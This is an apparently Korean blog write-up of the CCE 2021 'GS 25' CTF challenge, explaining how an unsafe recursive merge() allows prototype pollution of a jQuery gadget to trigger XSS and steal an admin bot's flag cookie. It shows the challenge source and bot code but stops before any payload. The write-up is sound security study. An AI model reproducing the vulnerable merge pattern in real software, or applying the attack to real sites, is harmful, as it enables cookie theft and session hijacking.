@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Summary25일에는 국정원에서 여는 CCE가 있었는데, 오후 11시 10분인가 대회 끝나기 몇 십 분 전에 아는 분이 풀어 주라고 해서 잠시 GS 25 문제를 풀어 보았는데 매우 쉽게 풀렸습니다. Prototype Pollution 취약점도 처음 공부할 때 조금 힘들었는데, 지금은 쉬운 취약점 중 하나 입니다.  GS 25 [2** pts]GS 25 문">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CCE 2021 GS 25 Write Up">
+<meta property="og:url" content="https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/index.html">
+<meta property="og:site_name" content="POCAS">
+<meta property="og:description" content="Summary25일에는 국정원에서 여는 CCE가 있었는데, 오후 11시 10분인가 대회 끝나기 몇 십 분 전에 아는 분이 풀어 주라고 해서 잠시 GS 25 문제를 풀어 보았는데 매우 쉽게 풀렸습니다. Prototype Pollution 취약점도 처음 공부할 때 조금 힘들었는데, 지금은 쉬운 취약점 중 하나 입니다.  GS 25 [2** pts]GS 25 문">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/134794962-40c6441c-6863-4a25-a588-9b56537e5935.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49112423/134795008-eb26caf9-7fa3-4a69-a509-5a729ee8cd57.png">
+<meta property="article:published_time" content="2021-09-26T23:29:53.000Z">
+<meta property="article:modified_time" content="2022-03-22T21:00:31.785Z">
+<meta property="article:author" content="POCAS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/49112423/134794962-40c6441c-6863-4a25-a588-9b56537e5935.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CCE 2021 GS 25 Write Up</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/01/24/2022-01-24-RealWrold-CTF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/09/26/2021-09-26-DownUnder-CTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&text=CCE 2021 GS 25 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&is_video=false&description=CCE 2021 GS 25 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CCE 2021 GS 25 Write Up&body=Check out this article: https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&name=CCE 2021 GS 25 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&t=CCE 2021 GS 25 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GS-25-2-pts"><span class="toc-number">2.</span> <span class="toc-text">GS 25 [2** pts]</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CCE 2021 GS 25 Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">POCAS</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-26T23:29:53.000Z" itemprop="datePublished">2021-09-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>25일에는 국정원에서 여는 CCE가 있었는데, 오후 11시 10분인가 대회 끝나기 몇 십 분 전에 아는 분이 풀어 주라고 해서 잠시 GS 25 문제를 풀어 보았는데 매우 쉽게 풀렸습니다. Prototype Pollution 취약점도 처음 공부할 때 조금 힘들었는데, 지금은 쉬운 취약점 중 하나 입니다.</p>
+<hr>
+<h3 id="GS-25-2-pts"><a href="#GS-25-2-pts" class="headerlink" title="GS 25 [2** pts]"></a>GS 25 [2** pts]</h3><p>GS 25 문제는 Prototype Pollution을 이용해 Jquery 가젯을 오염 시켜 XSS를 트리거 했습니다.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">~/Exploit/ctf/2021/CCE 2021 main*</span><br><span class="line">❯ tree for_user</span><br><span class="line">for_user</span><br><span class="line">└── for_user</span><br><span class="line">    ├── docker</span><br><span class="line">    │   ├── Dockerfile</span><br><span class="line">    │   └── src</span><br><span class="line">    │       ├── app.js</span><br><span class="line">    │       ├── package.json</span><br><span class="line">    │       ├── route</span><br><span class="line">    │       │   └── index.js</span><br><span class="line">    │       ├── run.sh</span><br><span class="line">    │       ├── static</span><br><span class="line">    │       │   ├── css</span><br><span class="line">    │       │   │   ├── free-v4-font-face.min.css</span><br><span class="line">    │       │   │   ├── free-v4-shims.min.css</span><br><span class="line">    │       │   │   ├── free.min.css</span><br><span class="line">    │       │   │   ├── main.css</span><br><span class="line">    │       │   │   ├── tetris.css</span><br><span class="line">    │       │   │   └── theme.css</span><br><span class="line">    │       │   ├── js</span><br><span class="line">    │       │   │   ├── axios.min.js</span><br><span class="line">    │       │   │   ├── axios.min.map</span><br><span class="line">    │       │   │   ├── bootstrap.min.js</span><br><span class="line">    │       │   │   ├── bootstrap.min.js.map</span><br><span class="line">    │       │   │   ├── fontawesome.js</span><br><span class="line">    │       │   │   ├── game</span><br><span class="line">    │       │   │   │   ├── piece.js</span><br><span class="line">    │       │   │   │   ├── tetris.js</span><br><span class="line">    │       │   │   │   └── tetrominoes.js</span><br><span class="line">    │       │   │   ├── index.js</span><br><span class="line">    │       │   │   ├── jquery-3.3.1.slim.min.js</span><br><span class="line">    │       │   │   ├── popper.min.js</span><br><span class="line">    │       │   │   └── popper.min.js.map</span><br><span class="line">    │       │   └── texture.jpg</span><br><span class="line">    │       └── views</span><br><span class="line">    │           ├── component</span><br><span class="line">    │           │   ├── footer.ejs</span><br><span class="line">    │           │   ├── header.ejs</span><br><span class="line">    │           │   └── navbar.ejs</span><br><span class="line">    │           ├── game.ejs</span><br><span class="line">    │           ├── index.ejs</span><br><span class="line">    │           └── login.ejs</span><br><span class="line">    ├── docker-compose.yml</span><br><span class="line">    └── robot</span><br><span class="line">        ├── Dockerfile</span><br><span class="line">        └── src</span><br><span class="line">            ├── app.js</span><br><span class="line">            ├── package-lock.json</span><br><span class="line">            ├── package.json</span><br><span class="line">            ├── run.sh</span><br><span class="line">            └── views</span><br><span class="line">                └── index.ejs</span><br><span class="line"></span><br><span class="line">13 directories, 37 files</span><br><span class="line"></span><br><span class="line">~/Exploit/ctf/2021/CCE 2021 main*</span><br><span class="line">❯</span><br></pre></td></tr></table></figure>
+<p>문제 코드는 위와 같이 주어졌습니다. 굉장히 많습니다 :(</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="comment">// const __DIR = &#x27;/usr/src/app&#x27;</span></span><br><span class="line"><span class="keyword">const</span> __DIR = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">&#x27;http://prob&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* express */</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __DIR + <span class="string">&#x27;/views&#x27;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>).<span class="property">renderFile</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; fileName, code &#125; = req.<span class="property">body</span></span><br><span class="line">  <span class="keyword">const</span> cookies = [&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;fileName&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: fileName</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;cce2021&#123;EXAMPLE_FLAG&#125;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> (<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123; <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>] &#125;)</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line"></span><br><span class="line">    page.<span class="title function_">on</span>(<span class="string">&#x27;dialog&#x27;</span>, <span class="keyword">async</span> dialog =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span>(dialog.<span class="title function_">message</span>() == <span class="string">&#x27;Input your game data code&#x27;</span>) <span class="keyword">await</span> dialog.<span class="title function_">accept</span>(code)</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">await</span> dialog.<span class="title function_">dismiss</span>()</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123;</span><br><span class="line">      <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle2&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(...cookies)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;#playBtn&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">await</span> page.<span class="property">keyboard</span>.<span class="title function_">type</span>(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>()</span><br><span class="line">  &#125;)()</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+<p>플래그 얻는 조건을 보면 관리자 봇의 쿠키를 탈취하면 되고, 탈취 하기 위해서는 XSS를 트리거 해야 합니다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loadGame</span>(<span class="params"></span>)&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> code = <span class="title function_">prompt</span>(<span class="string">&#x27;Input your game data code&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> req = <span class="keyword">await</span> axios.<span class="title function_">post</span>(<span class="string">&#x27;/loadGame&#x27;</span>, &#123; code &#125;)</span><br><span class="line">  <span class="keyword">const</span> result = req.<span class="property">data</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (result.<span class="property">state</span> !== <span class="string">&#x27;ok&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data = req.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">isObject</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj !== <span class="literal">null</span> &amp;&amp; <span class="keyword">typeof</span> obj === <span class="string">&#x27;object&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> b) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[key]) &amp;&amp; <span class="title function_">isObject</span>(b[key])) &#123;</span><br><span class="line">        <span class="title function_">merge</span>(a[key], b[key])</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        a[key] = b[key]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">cGameInfo</span> = <span class="keyword">new</span> <span class="title class_">GameInfo</span>()</span><br><span class="line">  <span class="title function_">merge</span>(<span class="variable language_">this</span>.<span class="property">cGameInfo</span>, data)</span><br><span class="line">  <span class="title function_">initScreen</span>()</span><br><span class="line">  <span class="title function_">initPiecesMap</span>(cGameInfo.<span class="property">panelRow</span>, cGameInfo.<span class="property">panelColume</span>)</span><br><span class="line">  <span class="title function_">initDisplayGamePanel</span>(cGameInfo.<span class="property">panelColume</span>, cGameInfo.<span class="property">panelRow</span>)</span><br><span class="line">  <span class="title function_">initNextBlockInfo</span>()</span><br><span class="line">  <span class="title function_">setNextPieces</span>()</span><br><span class="line">  <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">cGameInfo</span>.<span class="property">dropIntervalId</span>)</span><br><span class="line">  <span class="title function_">setDropInterval</span>()</span><br><span class="line">  $(<span class="variable language_">document</span>).<span class="title function_">off</span>(<span class="string">&#x27;keydown&#x27;</span>)</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, keyboardEventHandler)</span><br><span class="line">  $(<span class="variable language_">document</span>).<span class="title function_">off</span>(<span class="string">&#x27;touchmove&#x27;</span>)</span><br><span class="line">  <span class="title function_">setControleButton</span>()</span><br><span class="line">  </span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">cGameInfo</span>.<span class="title function_">changeSpeedDisplay</span>()</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">cGameInfo</span>.<span class="title function_">updateScore</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>소스 코드를 확인 하던 중에 tetris.js에서 loadGame() 이라는 함수를 발견 했습니다. loadGame() 함수는 &#x2F;loadGame로 고유의 Code 값을 요청 보내서 Code 값에 대응하는 게임의 정보(객체)를 가져와서, merge() 함수를 이용해 GameInfo 객체를 덮어 주고 있습니다.</p>
+<p>또한 해당 문제에서 Jquery 3.3.1을 사용 중이기 때문에 XSS 가젯을 찾고, 해당 가젯을 오염 시켜 XSS를 트리거 하기로 했습니다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">off</span>(<span class="string">&#x27;keydown&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, keyboardEventHandler)</span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">off</span>(<span class="string">&#x27;touchmove&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>loadGame() 함수를 자세히 보니 내부에 XSS 가젯이 존재하는 것을 확인할 수 있었습니다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">keyboardEventHandler</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="comment">//space 키 =&gt; c</span></span><br><span class="line">  <span class="keyword">if</span>(e.<span class="property">keyCode</span> == <span class="number">67</span>) &#123;</span><br><span class="line">    cGameInfo.<span class="property">cPiece</span>.<span class="title function_">moveEndDown</span>();</span><br><span class="line">  <span class="comment">//왼쪽 화살표 =&gt; a</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(e.<span class="property">keyCode</span> == <span class="number">65</span>) &#123;</span><br><span class="line">    cGameInfo.<span class="property">cPiece</span>.<span class="title function_">moveLeft</span>();</span><br><span class="line">  <span class="comment">//위쪽 화살표 =&gt; w</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(e.<span class="property">keyCode</span> == <span class="number">87</span>)  &#123;</span><br><span class="line">    cGameInfo.<span class="property">cPiece</span>.<span class="title function_">rotate</span>();</span><br><span class="line">  <span class="comment">//오른쪽 화살표 =&gt; d</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(e.<span class="property">keyCode</span> == <span class="number">68</span>)  &#123;</span><br><span class="line">    cGameInfo.<span class="property">cPiece</span>.<span class="title function_">moveRight</span>();</span><br><span class="line">  <span class="comment">//아래 화살표 =&gt; s</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(e.<span class="property">keyCode</span> == <span class="number">83</span>)  &#123;</span><br><span class="line">    cGameInfo.<span class="property">cPiece</span>.<span class="title function_">moveDown</span>();</span><br><span class="line">  <span class="comment">//세이브 =&gt; p</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(e.<span class="property">keyCode</span> == <span class="number">80</span>) &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">saveGame</span>()</span><br><span class="line">  <span class="comment">// 로드 =&gt; l</span></span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(e.<span class="property">keyCode</span> == <span class="number">76</span>) &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">loadGame</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>loadGame() 함수는 자동으로 호출 해주지 않고, 키보드로 L, l을 입력해야 실행을 해주고 있었습니다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;#playBtn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> page.<span class="property">keyboard</span>.<span class="title function_">type</span>(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">1000</span>))</span><br></pre></td></tr></table></figure>
+<p>하지만 관리자 봇에서 keyboard 메서드를 이용해서 l을 입력 하고 있기 때문에 관리자 봇에서도 결국엔 loadGame() 함수가 실행 되기 때문에 그냥 익스를 시도 하면 되겠다고 생각했습니다.</p>
